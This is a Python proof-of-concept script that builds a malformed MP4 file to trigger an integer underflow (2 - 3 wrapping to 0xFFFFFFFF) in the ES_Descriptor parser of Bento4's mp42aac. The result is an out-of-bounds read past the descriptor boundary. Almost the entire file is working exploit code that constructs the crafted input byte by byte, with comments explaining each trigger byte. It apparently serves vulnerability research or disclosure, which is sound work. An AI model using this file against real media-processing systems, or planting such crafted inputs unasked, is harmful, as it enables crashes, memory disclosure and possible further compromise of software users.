#!/usr/bin/env python3
"""
PoC generator for VULN 002: Integer Underflow in AP4_EsDescriptor
Target  : Bento4 mp42aac binary
File    : Source/C++/Core/Ap4EsDescriptor.cpp, lines 100-109

Vulnerability:
  AP4_EsDescriptor constructor records 'start' position, then:
    - Reads ES_ID  (2 bytes)
    - Reads flags  (1 byte)
  After these reads, offset = Tell() = start + 3.
  It then computes:   payload_size - AP4_Size(offset - start)
                    = payload_size - 3
  When payload_size = 2, this is:  2 - 3 = 0xFFFFFFFF  (uint32 underflow).
  A SubStream of size 0xFFFFFFFF is created, allowing the descriptor
  factory loop to read far beyond the ES_Descriptor boundary.

Trigger:
  esds box payload contains ES_Descriptor with declared payload_size = 2.
  The parser ALWAYS reads 3 bytes (ES_ID 2B + flags 1B), so
  offset-start = 3 > payload_size = 2  =>  underflow.

  Extra bytes placed inside the esds box (but outside the declared 2-byte
  payload) are visible to the inner SubStream and provide a controlled
  out-of-bounds read target.

Output: writes vuln_002.mp4 next to this script.
"""

import struct
import os
import sys

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def box(fourcc, payload):
    """Build an MP4 box: size(4) + fourcc(4) + payload."""
    data = payload if isinstance(payload, (bytes, bytearray)) else b''.join(payload)
    return struct.pack('>I', 8 + len(data)) + fourcc.encode('latin-1') + data


def fullbox(fourcc, version, flags, payload):
    """Build a FullBox: size(4) + fourcc(4) + version(1) + flags(3) + payload."""
    hdr = struct.pack('>I', (version << 24) | (flags & 0xFFFFFF))
    data = payload if isinstance(payload, (bytes, bytearray)) else b''.join(payload)
    return box(fourcc, hdr + data)


def encode_descriptor_size(size):
    """MPEG-4 expandable-size encoding."""
    if size < 0x80:
        return bytes([size])
    elif size < 0x4000:
        return bytes([0x80 | (size >> 7), size & 0x7F])
    elif size < 0x200000:
        return bytes([0x80 | (size >> 14), 0x80 | ((size >> 7) & 0x7F), size & 0x7F])
    else:
        return bytes([0x80 | (size >> 21),
                      0x80 | ((size >> 14) & 0x7F),
                      0x80 | ((size >> 7) & 0x7F),
                      size & 0x7F])


# ---------------------------------------------------------------------------
# Build the underflow-triggering esds box
# ---------------------------------------------------------------------------

def build_esds():
    """
    Craft an esds box whose ES_Descriptor has a declared payload_size of 2,
    but the parser always reads 3 bytes (ES_ID 2B + flags 1B), causing:

        payload_size(2) - AP4_Size(offset-start)(3) = 0xFFFFFFFF  (underflow)

    Byte layout of the esds descriptor area (after version/flags 4B):

        Offset  Byte   Meaning
        ------  ----   -------
          +0    0x03   ES_Descriptor tag
          +1    0x02   declared payload_size = 2  <-- UNDERFLOW TRIGGER
          +2    0x00   ES_ID high  (declared payload byte 1)
          +3    0x01   ES_ID low   (declared payload byte 2)
          +4    0x00   flags byte  -- read OUTSIDE declared payload (3rd byte)!
                       flags=0x00 => no optional fields; underflow fires here
         ---- SubStream with size 0xFFFFFFFF starts reading from here ----
          +5    0x05   fake DecoderSpecificInfo tag (tag=0x05)
          +6    0x02   VLE size = 2 bytes
          +7    0x11   DSI byte 0  (AAC-LC, 44100 Hz marker)
          +8    0x90   DSI byte 1  (stereo)
          +9..  0x00*  padding zeros (also read by factory through adjacency)

    The outer factory correctly seeks the stream to offset+header+payload
    = pos_before_0x03 + 2 + 2 = pos_before_0x03 + 4, so the bytes at +4
    onwards are skipped by the outer parser but are WITHIN the esds box
    and will be read by the inner SubStream.

    Bytes after the esds box (stts, stsc, stsz, stco headers, then mdat)
    are also accessible through the 0xFFFFFFFF-sized SubStream and will
    be parsed as additional spurious descriptors.
    """

    # --- ES_Descriptor bytes (these go inside the esds box payload) ---
    es_tag          = b'\x03'
    es_size         = b'\x02'          # declared payload = 2 bytes (UNDERFLOW!)
    es_id           = b'\x00\x01'     # ES_ID = 1  (the 2 declared payload bytes)

    # Extra bytes outside declared payload but within esds box:
    flags_byte      = b'\x00'          # read as the flags field (OOB read #1)
    # SubStream reads these as child descriptors:
    fake_dsi_tag    = b'\x05'          # DecoderSpecificInfo tag
    fake_dsi_size   = b'\x02'          # declared 2 bytes
    fake_dsi_data   = b'\x11\x90'     # AAC-LC @ 44100 Hz, stereo (AudioSpecificConfig)
    padding         = b'\x00' * 4      # extra zeros (will be read by factory)

    descriptor_bytes = (es_tag + es_size + es_id +
                        flags_byte + fake_dsi_tag + fake_dsi_size +
                        fake_dsi_data + padding)

    # esds FullBox: version=0, flags=0, then descriptor bytes
    esds_payload = struct.pack('>I', 0x00000000) + descriptor_bytes
    return box('esds', esds_payload)


# ---------------------------------------------------------------------------
# Build the rest of the MP4 structure
# ---------------------------------------------------------------------------

def build_mp4():
    # --- ftyp ---
    ftyp = box('ftyp',
               b'M4A ' +                    # major brand
               struct.pack('>I', 0x200) +   # minor version
               b'M4A ' + b'iso2' + b'mp41') # compatible brands

    # --- esds (inside mp4a) ---
    esds = build_esds()

    # --- mp4a sample entry ---
    mp4a_audio = (
        bytes(6) +                              # 6B reserved
        struct.pack('>H', 1) +                  # data-reference-index = 1
        bytes(8) +                              # 8B reserved
        struct.pack('>H', 2) +                  # channel-count = 2
        struct.pack('>H', 16) +                 # sample-size = 16 bit
        struct.pack('>H', 0) +                  # pre-defined
        struct.pack('>H', 0) +                  # reserved
        struct.pack('>I', 44100 << 16)          # sample-rate = 44100 (16.16)
    )
    mp4a = box('mp4a', mp4a_audio + esds)

    # --- stsd ---
    stsd_payload = (struct.pack('>I', 0x00000000) +  # version+flags
                    struct.pack('>I', 1) +             # entry-count = 1
                    mp4a)
    stsd = box('stsd', stsd_payload)

    # --- stts (1 sample, duration 1024) ---
    stts = fullbox('stts', 0, 0,
                   struct.pack('>II', 1, 1) +   # entry-count, sample-count
                   struct.pack('>I', 1024))      # sample-delta

    # --- stsc (all samples in one chunk) ---
    stsc = fullbox('stsc', 0, 0,
                   struct.pack('>I', 1) +        # entry-count
                   struct.pack('>III', 1, 1, 1)) # first-chunk, samp/chunk, desc-idx

    # --- stsz (1 sample, size 100) ---
    stsz = fullbox('stsz', 0, 0,
                   struct.pack('>II', 0, 1) +    # sample-size=0 (variable), count=1
                   struct.pack('>I', 100))        # entry[0] = 100 bytes

    # --- stco placeholder (will be patched) ---
    stco_placeholder = fullbox('stco', 0, 0,
                               struct.pack('>I', 1) +   # entry-count = 1
                               struct.pack('>I', 0))     # chunk-offset = TBD

    # --- stbl ---
    stbl = box('stbl', stsd + stts + stsc + stsz + stco_placeholder)

    # --- dinf / dref ---
    url_box   = fullbox('url ', 0, 1, b'')         # flags=1 = self-contained
    dref      = fullbox('dref', 0, 0,
                        struct.pack('>I', 1) + url_box)  # entry-count=1
    dinf      = box('dinf', dref)

    # --- smhd ---
    smhd = fullbox('smhd', 0, 0, struct.pack('>HH', 0, 0))  # balance=0, reserved=0

    # --- minf ---
    minf = box('minf', smhd + dinf + stbl)

    # --- hdlr ---
    hdlr = fullbox('hdlr', 0, 0,
                   struct.pack('>I', 0) +       # pre-defined
                   b'soun' +                    # handler type
                   bytes(12) +                  # reserved
                   b'Sound Handler\x00')        # name

    # --- mdhd ---
    mdhd = fullbox('mdhd', 0, 0,
                   struct.pack('>IIII', 0, 0, 44100, 1024) +  # ctime, mtime, timescale, duration
                   struct.pack('>I', 0x55C40000))              # language='und' + pre-defined

    # --- mdia ---
    mdia = box('mdia', mdhd + hdlr + minf)

    # --- tkhd ---
    matrix = struct.pack('>9I',
                         0x00010000, 0, 0,
                         0, 0x00010000, 0,
                         0, 0, 0x40000000)
    tkhd = fullbox('tkhd', 0, 3,  # flags=3: track enabled + in movie
                   struct.pack('>IIIII', 0, 0, 1, 0, 1024) +   # ctime, mtime, track-id, reserved, duration
                   bytes(8) +                                    # reserved
                   struct.pack('>HH', 0, 0) +                   # layer, alt-group
                   struct.pack('>HH', 0x0100, 0) +              # volume=1.0, reserved
                   matrix +
                   struct.pack('>II', 0, 0))                    # width, height

    # --- trak ---
    trak = box('trak', tkhd + mdia)

    # --- mvhd ---
    mvhd = fullbox('mvhd', 0, 0,
                   struct.pack('>IIII', 0, 0, 1000, 2) +   # ctime, mtime, timescale, duration
                   struct.pack('>I', 0x00010000) +          # rate = 1.0
                   struct.pack('>H', 0x0100) +              # volume = 1.0
                   bytes(10) +                              # reserved
                   matrix +
                   bytes(24) +                              # pre-defined
                   struct.pack('>I', 2))                    # next-track-id

    # --- moov (first pass, to learn its size) ---
    moov_payload_0 = mvhd + trak
    moov_0 = box('moov', moov_payload_0)

    # --- mdat placeholder ---
    # After ftyp+moov comes mdat; audio chunk starts after mdat's 8-byte header.
    mdat_content = (
        # Some plausible but silent AAC-like padding
        bytes(100)
    )
    mdat = box('mdat', mdat_content)

    # The chunk offset = len(ftyp) + len(moov_0) + 8 (mdat box header)
    chunk_offset = len(ftyp) + len(moov_0) + 8

    # --- stco with real offset ---
    stco_real = fullbox('stco', 0, 0,
                        struct.pack('>I', 1) +
                        struct.pack('>I', chunk_offset))

    # Rebuild stbl, minf, mdia, trak, moov with patched stco
    stbl_real  = box('stbl',  stsd + stts + stsc + stsz + stco_real)
    minf_real  = box('minf',  smhd + dinf + stbl_real)
    mdia_real  = box('mdia',  mdhd + hdlr + minf_real)
    trak_real  = box('trak',  tkhd + mdia_real)
    moov_real  = box('moov',  mvhd + trak_real)

    return ftyp + moov_real + mdat


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

if __name__ == '__main__':
    out_dir = os.path.dirname(os.path.abspath(__file__))
    out_path = os.path.join(out_dir, 'vuln_002.mp4')

    data = build_mp4()

    with open(out_path, 'wb') as f:
        f.write(data)

    print(f"[+] Written {len(data)} bytes to {out_path}")
    print(f"[+] Underflow trigger: ES_Descriptor declared payload_size=2,")
    print(f"    but parser reads 3 bytes (ES_ID 2B + flags 1B).")
    print(f"    Integer underflow: 2 - 3 = 0xFFFFFFFF (uint32).")
    print(f"    SubStream of size 0xFFFFFFFF created; factory reads far beyond boundary.")
